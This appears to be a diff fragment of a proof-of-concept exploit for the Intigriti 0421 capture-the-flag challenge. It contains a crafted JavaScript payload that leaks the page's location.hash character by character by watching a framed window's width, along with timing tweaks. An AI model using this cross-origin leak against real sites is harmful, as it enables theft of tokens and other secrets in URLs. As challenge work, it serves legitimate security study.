@@ -17,7 +17,7 @@
         const alph = "0123456789abcdefghijklmnopqrstuvwxyz~"
         const payload = alph.split('').map(c =>
             `location.hash+/${c}/.source</##/.source+identifier&&++width`
-        ).join(',')
+        ).join('&&')
 
         const thisUrl = location.href.replace('http://', 'https://');
         const top_url = 'https://challenge-0421.intigriti.io/?error=' + encodeURIComponent(
@@ -46,17 +46,19 @@
                 width = top.lload.innerWidth;
             }catch(e){
                 // not loaded yet
-                setTimeout(watchForWidthChange, 0);
+                return setTimeout(watchForWidthChange, 0);
             }
 
             if (width !== lastValue) {
+                // not sure why the poc needs to wait here for such a long time
+                // but breaks otherwise (probably some race condition)
                 await sleep(60);
                 width = top.lload.innerWidth;
                 const newWidth = width - lastValue;
                 lastValue = width;
                 new_char(newWidth - 1);
             }else{
-                setTimeout(watchForWidthChange, 0);
+                setTimeout(watchForWidthChange, 20);
             }
         }
 
